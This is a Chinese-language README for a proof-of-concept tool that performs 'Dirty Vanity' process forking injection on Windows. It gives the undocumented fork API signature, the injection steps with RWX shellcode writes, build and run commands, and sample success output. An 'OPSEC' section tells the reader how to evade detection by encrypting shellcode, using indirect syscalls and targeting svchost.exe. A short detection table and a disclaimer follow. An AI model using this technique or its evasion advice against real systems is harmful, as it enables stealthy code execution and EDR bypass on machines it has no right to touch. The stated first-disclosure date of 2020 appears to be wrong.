# Process Forking Injection - Dirty Vanity (进程分叉注入)

## 技术概述

Process Forking Injection (Dirty Vanity) 是一种利用 Windows 未公开的 Fork API (`RtlCreateProcessReflection`) 实现代码注入的新颖技术。通过"分叉"目标进程并设置自定义入口点，可以在新进程中执行 shellcode。

## 核心原理

### Windows Fork API

Windows 从 Windows 10 1809 开始引入了未公开的 `RtlCreateProcessReflection` API，类似于 Unix 的 `fork()` 系统调用，用于创建当前进程的副本（Process Mirroring）。

```c
typedef NTSTATUS(NTAPI* RtlCreateProcessReflectionFunc)(
    HANDLE ProcessHandle,        // 要镜像的进程句柄
    ULONG Flags,                 // 克隆标志
    PVOID StartRoutine,          // 镜像进程的入口点（shellcode 地址）
    PVOID StartContext,          // 传递给入口点的参数
    HANDLE EventHandle,          // 事件句柄（可选）
    T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION* ReflectionInformation  // 输出信息
);
```

### 克隆标志

```c
#define RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED  0x00000001  // 创建挂起的进程
#define RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES   0x00000002  // 继承句柄
#define RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE    0x00000004  // 不更新同步对象
```

### 注入流程

```
1. 打开目标进程
   ├─ PROCESS_VM_OPERATION
   ├─ PROCESS_VM_WRITE
   ├─ PROCESS_CREATE_THREAD
   └─ PROCESS_DUP_HANDLE

2. 分配内存并写入 shellcode
   ├─ VirtualAllocEx (PAGE_EXECUTE_READWRITE)
   └─ WriteProcessMemory

3. 加载 ntdll.dll 并解析 RtlCreateProcessReflection
   ├─ LoadLibraryA("ntdll.dll")
   └─ GetProcAddress("RtlCreateProcessReflection")

4. 调用 RtlCreateProcessReflection
   ├─ ProcessHandle = 目标进程句柄
   ├─ Flags = RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
   ├─ StartRoutine = shellcode 地址
   └─ 获取镜像进程的 PID 和句柄

5. Shellcode 在镜像进程中执行
   └─ 镜像进程继承目标进程的内存、句柄等资源
```

## 执行流程图

```
OpenProcess(PID)
    ↓
获取目标进程句柄
    ↓
VirtualAllocEx + WriteProcessMemory
    ↓
在目标进程中写入 shellcode
    ↓
LoadLibraryA("ntdll.dll")
    ↓
GetProcAddress("RtlCreateProcessReflection")
    ↓
RtlCreateProcessReflection(
    hProcess,
    RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
    shellcode_address,  ← StartRoutine
    NULL,
    NULL,
    &reflectionInfo
)
    ↓
创建镜像进程
    ↓
镜像进程从 shellcode 地址开始执行 ✨
```

## 编译与使用

### Windows (build.bat)

```batch
build.bat
```

### Linux/Git Bash (build.sh)

```bash
chmod +x build.sh
./build.sh
```

### 生成 Shellcode

```cmd
cd build

# 生成 calc.exe shellcode
generate_shellcode.exe calc

# 生成 messagebox shellcode
generate_shellcode.exe messagebox

# 生成所有 shellcode
generate_shellcode.exe all
```

### 运行注入

```cmd
# 语法
process_forking.exe <target_pid> <shellcode.bin>

# 示例：注入到 notepad.exe
start notepad
process_forking.exe 1234 calc_shellcode.bin
```

**输出示例**：
```
[+] Process Forking Injection POC (Dirty Vanity)
[+] Windows Fork API Abuse - RtlCreateProcessReflection

[+] Loaded shellcode: 65 bytes

[+] Process Forking Injection (Dirty Vanity)
[+] Target PID: 1234
[+] Shellcode size: 65 bytes
[+] Opened target process
[+] Allocated remote memory at 0000000002D40000
[+] Wrote shellcode to remote process
[+] Resolved RtlCreateProcessReflection at 00007FFE8C6F1234

[+] Successfully forked process!
[+] Forked process PID: 5678
[+] Forked process handle: 0000000000000ABC
[+] Forked thread handle: 0000000000000DEF

[+] Process forking injection successful!
```

## 技术特点

| 特性 | 描述 |
|-----|------|
| ✅ 极高隐蔽性 | 使用 Windows 未公开的 Fork API |
| ✅ 进程继承 | 镜像进程继承目标进程的内存、句柄、DLL |
| ✅ 自定义入口点 | StartRoutine 参数直接指向 shellcode |
| ✅ 无需创建线程 | 不使用 CreateRemoteThread |
| ⚠️ 系统限制 | 需要 Windows 10 1809+ |
| ⚠️ 权限要求 | 需要 PROCESS_VM_OPERATION、PROCESS_VM_WRITE、PROCESS_CREATE_THREAD、PROCESS_DUP_HANDLE |

## OPSEC 改进建议

⚠️ **这是 POC，不可直接用于生产环境！**

### 必须修改的部分

1. **内存保护**
   - ❌ 当前使用 PAGE_EXECUTE_READWRITE
   - ✅ 改为 PAGE_READWRITE → 写入后改为 PAGE_EXECUTE_READ

2. **Shellcode 存储**
   - ❌ 明文存储
   - ✅ 使用加密/混淆存储

3. **API 调用**
   - ❌ 直接调用 RtlCreateProcessReflection
   - ✅ 使用 Indirect Syscalls

4. **进程选择**
   - ❌ 随意选择目标进程
   - ✅ 选择高权限、合法的系统进程（如 svchost.exe）

## 防御检测方法

| 检测层面 | 方法 |
|---------|------|
| **API 监控** | Hook RtlCreateProcessReflection，检测异常调用 |
| **进程监控** | 检测突然出现的子进程（无 CreateProcess 调用） |
| **内存扫描** | 扫描可执行内存中的 shellcode 特征 |
| **行为分析** | 监控进程树异常（父子进程关系不合理） |
| **ETW/Sysmon** | 监控进程创建事件（Event ID 1） |

## 技术来源

- **原作者**: Deep Instinct Research Team
- **原仓库**: [deepinstinct/Dirty-Vanity](https://github.com/deepinstinct/Dirty-Vanity)
- **首次公开**: 2020 年
- **技术文章**: [Dirty Vanity: A New Approach to Code Injection](https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass)

## 致谢

- [Deep Instinct](https://www.deepinstinct.com/) - 技术发现和实现
- [Alex Ionescu](https://twitter.com/aionescu) - Windows 内部机制研究

## 参考链接

- [Deep Instinct Repository](https://github.com/deepinstinct/Dirty-Vanity)
- [Deep Instinct Blog - Dirty Vanity](https://www.deepinstinct.com/blog/dirty-vanity-a-new-approach-to-code-injection-edr-bypass)
- [Windows Process Reflection](https://www.cyberark.com/resources/threat-research-blog/the-case-of-the-edr-bypassing-process-injection)
- [RtlCreateProcessReflection Documentation](https://ntdoc.m417z.com/rtlcreateprocessreflection)

## 重要提示

1. **仅限研究和防御用途**
   - 此技术仅用于安全研究和防御目的
   - 不得用于恶意攻击

2. **系统兼容性**
   - 需要 Windows 10 1809 或更高版本
   - Windows 11 同样支持

3. **权限要求**
   - 需要足够的权限打开目标进程
   - 某些系统进程需要管理员权限

4. **不稳定性**
   - `RtlCreateProcessReflection` 是未公开的 API
   - 可能在未来的 Windows 版本中被移除或修改
